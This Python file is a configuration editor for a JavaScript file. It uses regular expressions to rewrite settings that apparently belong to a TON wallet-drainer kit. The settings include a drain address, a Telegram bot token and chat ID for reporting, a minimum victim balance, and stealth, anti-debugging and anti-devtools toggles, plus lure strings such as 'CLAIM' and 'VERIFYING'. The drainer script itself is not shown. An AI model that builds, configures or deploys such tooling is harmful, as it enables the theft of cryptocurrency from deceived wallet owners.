import re
import os
from config import CACHIAS_JS_PATH

CONFIG_FIELDS = {
    "DISALLOW_BALANCE": {
        "type": "float",
        "pattern": r'(DISALLOW_BALANCE:\s*)([\d.]+)(\s*,?\s*//.*)?',
        "format": lambda v: str(float(v))
    },
    "STEALTH_MODE": {
        "type": "bool",
        "pattern": r'(STEALTH_MODE:\s*)(true|false)(\s*,?\s*//.*)?',
        "format": lambda v: "true" if v else "false"
    },
    "ANTI_CONSOLE": {
        "type": "bool",
        "pattern": r'(ANTI_CONSOLE:\s*)(true|false)(\s*,?\s*//.*)?',
        "format": lambda v: "true" if v else "false"
    },
    "MANIFEST_URL": {
        "type": "string",
        "pattern": r"(MANIFEST_URL:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "TONAPI_BASE": {
        "type": "string",
        "pattern": r"(TONAPI_BASE:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "DRAIN_ADDRESS": {
        "type": "string",
        "pattern": r"(DRAIN_ADDRESS:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "TELEGRAM_BOT_TOKEN": {
        "type": "string",
        "pattern": r"(TELEGRAM_BOT_TOKEN:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "TELEGRAM_CHAT_ID": {
        "type": "string",
        "pattern": r"(TELEGRAM_CHAT_ID:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "ANTI_TAMPER": {
        "type": "bool",
        "pattern": r'(ANTI_TAMPER:\s*)(true|false)(\s*,?\s*//.*)?',
        "format": lambda v: "true" if v else "false"
    },
    "ANTI_DEBUG": {
        "type": "bool",
        "pattern": r'(ANTI_DEBUG:\s*)(true|false)(\s*,?\s*//.*)?',
        "format": lambda v: "true" if v else "false"
    },
    "ANTI_DEV_TOOLS": {
        "type": "bool",
        "pattern": r'(ANTI_DEV_TOOLS:\s*)(true|false)(\s*,?\s*//.*)?',
        "format": lambda v: "true" if v else "false"
    },
    "VERIFY_DELAY_MS": {
        "type": "int",
        "pattern": r'(VERIFY_DELAY_MS:\s*)(\d+)(\s*,?\s*//.*)?',
        "format": lambda v: str(int(v))
    },
    "CONNECT": {
        "type": "string",
        "pattern": r"(CONNECT:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "DISCONNECT": {
        "type": "string",
        "pattern": r"(DISCONNECT:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "CONNECTING": {
        "type": "string",
        "pattern": r"(CONNECTING:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "CLAIM": {
        "type": "string",
        "pattern": r"(CLAIM:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "VERIFYING": {
        "type": "string",
        "pattern": r"(VERIFYING:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "VERIFY_SUCCESS": {
        "type": "string",
        "pattern": r"(VERIFY_SUCCESS:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "VERIFY_FAILED": {
        "type": "string",
        "pattern": r"(VERIFY_FAILED:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "ERR_INIT": {
        "type": "string",
        "pattern": r"(ERR_INIT:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "ERR_NETWORK": {
        "type": "string",
        "pattern": r"(ERR_NETWORK:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "ERR_CANCELLED": {
        "type": "string",
        "pattern": r"(ERR_CANCELLED:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "ERR_BALANCE": {
        "type": "string",
        "pattern": r"(ERR_BALANCE:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "ERR_UNKNOWN": {
        "type": "string",
        "pattern": r"(ERR_UNKNOWN:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "ERR_TONWEB": {
        "type": "string",
        "pattern": r"(ERR_TONWEB:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "INFO_CONNECTED": {
        "type": "string",
        "pattern": r"(INFO_CONNECTED:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "INFO_DISCONNECTED": {
        "type": "string",
        "pattern": r"(INFO_DISCONNECTED:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "BALANCE_TOO_LOW": {
        "type": "string",
        "pattern": r"(BALANCE_TOO_LOW:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "RETRY": {
        "type": "string",
        "pattern": r"(RETRY:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "CANCEL": {
        "type": "string",
        "pattern": r"(CANCEL:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    },
    "OK": {
        "type": "string",
        "pattern": r"(OK:\s*')([^']*)(')(\s*,?\s*//.*)?",
        "format": lambda v: f"'{v}'"
    }
}

def read_file_content() -> str:
    if not os.path.exists(CACHIAS_JS_PATH):
        return ""
    with open(CACHIAS_JS_PATH, "r", encoding="utf-8") as f:
        return f.read()

def write_file_content(content: str):
    with open(CACHIAS_JS_PATH, "w", encoding="utf-8") as f:
        f.write(content)

def apply_edit(content: str, key: str, value) -> str:
    if key not in CONFIG_FIELDS:
        raise ValueError(f"Unknown config key: {key}")
    info = CONFIG_FIELDS[key]
    formatted = info["format"](value)

    def repl(m):
        prefix = m.group(1)
        suffix = m.group(3) if m.lastindex >= 3 else ""
        extra = m.group(4) if m.lastindex >= 4 else ""
        return prefix + formatted + suffix + extra

    return re.sub(info["pattern"], repl, content)

def read_config_from_content(content: str) -> dict:
    current = {}
    for key, info in CONFIG_FIELDS.items():
        match = re.search(info["pattern"], content)
        if match:
            current[key] = match.group(2)
    return current